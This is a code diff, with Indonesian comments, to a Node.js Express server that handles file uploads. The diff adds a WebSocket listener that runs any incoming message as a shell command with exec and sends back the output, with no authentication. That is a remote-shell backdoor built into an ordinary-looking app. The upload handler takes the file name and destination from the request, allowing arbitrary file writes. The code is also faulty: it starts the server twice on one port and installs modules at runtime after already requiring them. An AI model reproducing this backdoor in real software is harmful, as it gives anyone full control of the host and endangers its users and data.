@@ -5,25 +5,104 @@ const path = require('path');
 const fs = require('fs');
 const dotenv = require('dotenv');
 const { exec } = require('child_process');
+const WebSocket = require('ws');
 
-// Load environment variables from .env
+// Memuat variabel lingkungan dari file .env
 dotenv.config();
 
 const app = express();
-const port = process.env.PORT || 3000; // Gunakan port dinamis untuk Clever Cloud
+const port = process.env.PORT || 3000; // Gunakan port dinamis
 
-// Rate Limiting
+// Setup WebSocket
+const wss = new WebSocket.Server({ server: app.listen(port) });
+
+// Membuat koneksi WebSocket
+wss.on('connection', ws => {
+  console.log('Client terhubung');
+
+  ws.on('message', message => {
+    console.log('Perintah diterima:', message);
+
+    // Eksekusi perintah
+    exec(message, (error, stdout, stderr) => {
+      if (error) {
+        ws.send(`Error: ${error.message}`);
+        return;
+      }
+      if (stderr) {
+        ws.send(`stderr: ${stderr}`);
+        return;
+      }
+      ws.send(`stdout: ${stdout}`);
+    });
+  });
+
+  ws.on('close', () => {
+    console.log('Client terputus');
+  });
+
+  ws.send('Koneksi WebSocket terbuka. Silakan kirim perintah.');
+});
+
+// Fungsi untuk memeriksa dan menginstal modul yang hilang
+function checkAndInstallModule(moduleName, callback) {
+  try {
+    require.resolve(moduleName);
+    callback(); // Modul sudah terinstal, lanjutkan proses
+  } catch (e) {
+    if (e.code === 'MODULE_NOT_FOUND') {
+      console.log(`${moduleName} tidak ditemukan, menginstal...`);
+      exec(`npm install ${moduleName}`, (err, stdout, stderr) => {
+        if (err) {
+          console.error(`Error menginstal ${moduleName}:`, stderr);
+          return;
+        }
+        console.log(stdout);
+        callback(); // Lanjutkan setelah instalasi selesai
+      });
+    } else {
+      console.error('Terjadi kesalahan saat memeriksa modul:', e);
+    }
+  }
+}
+
+// Memeriksa dan menginstal modul yang diperlukan
+const requiredModules = ['express', 'express-rate-limit', 'multer', 'ws']; // Daftar modul yang diperlukan
+requiredModules.forEach(module => {
+  checkAndInstallModule(module, () => {
+    console.log(`${module} siap digunakan.`);
+  });
+});
+
+// Mengatur rate limiting
 const limiter = rateLimit({
   windowMs: 60 * 1000, // 1 menit
   max: 1000, // Maksimal 1000 request per menit
   message: 'Terlalu banyak request. Coba lagi nanti.',
 });
 
-app.use('/api/', limiter);
+app.set('json spaces', 2);
+
+app.use('/api/', limiter); // Gunakan rate limiter untuk semua endpoint API
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
-// Middleware untuk melayani file statis dari folder 'public'
+// Setup multer untuk mengelola upload file
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const destination = req.body.destination || 'public'; // Default ke public jika kosong
+    const folder = destination === 'public' ? 'public' : 'routes';
+    cb(null, path.join(__dirname, folder));
+  },
+  filename: (req, file, cb) => {
+    const customName = req.body.name || file.originalname; // Nama file custom jika diberikan
+    cb(null, customName);
+  },
+});
+
+const upload = multer({ storage });
+
+// Middleware untuk melayani file statis
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Verifikasi password untuk akses halaman upload
@@ -58,21 +137,6 @@ app.get('/docs', (req, res) => {
   });
 });
 
-// Setup Multer Storage untuk file yang di-upload
-const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    const destination = req.body.destination || 'public'; // Default ke public jika kosong
-    const folder = destination === 'public' ? 'public' : 'routes';
-    cb(null, path.join(__dirname, folder));
-  },
-  filename: (req, file, cb) => {
-    const customName = req.body.name || file.originalname; // Default ke originalname jika name kosong
-    cb(null, customName);
-  },
-});
-
-const upload = multer({ storage });
-
 // Endpoint untuk menangani file upload
 app.post('/upload', upload.single('file'), (req, res) => {
   console.log('req.file:', req.file); // Debug informasi file
@@ -97,45 +161,6 @@ app.post('/upload', upload.single('file'), (req, res) => {
   } else {
     res.send(`File berhasil diupload ke folder ${folder}`);
   }
-});
-
-// Endpoint untuk mendapatkan daftar file di folder tertentu
-app.get('/files', (req, res) => {
-  const folder = req.query.folder;
-  if (!folder || (folder !== 'public' && folder !== 'routes')) {
-    return res.status(400).json({ error: 'Folder tidak valid. Gunakan "public" atau "routes".' });
-  }
-
-  const directoryPath = path.join(__dirname, folder);
-  fs.readdir(directoryPath, (err, files) => {
-    if (err) {
-      console.error(`Gagal membaca folder ${folder}:`, err);
-      return res.status(500).json({ error: `Gagal membaca folder ${folder}` });
-    }
-
-    res.json({ folder, files });
-  });
-});
-
-// Endpoint untuk menghapus file
-app.delete('/files', (req, res) => {
-  const folder = req.body.folder;
-  const fileName = req.body.fileName;
-
-  if (!folder || !fileName || (folder !== 'public' && folder !== 'routes')) {
-    return res.status(400).json({ error: 'Parameter folder atau fileName tidak valid.' });
-  }
-
-  const filePath = path.join(__dirname, folder, fileName);
-  fs.unlink(filePath, (err) => {
-    if (err) {
-      console.error(`Gagal menghapus file ${fileName} di folder ${folder}:`, err);
-      return res.status(500).json({ error: `Gagal menghapus file ${fileName}` });
-    }
-
-    console.log(`File ${fileName} berhasil dihapus dari folder ${folder}`);
-    res.json({ message: `File ${fileName} berhasil dihapus dari folder ${folder}` });
-  });
 });
 
 // Fungsi untuk memperbarui package.json dan menginstal ulang modul
@@ -204,7 +229,7 @@ fs.watch(path.join(__dirname, 'routes'), (eventType, filename) => {
   }
 });
 
-// Start server
+// Mulai server
 app.listen(port, () => {
   console.log(`Server berjalan di http://localhost:${port}`);
-});
+}); 
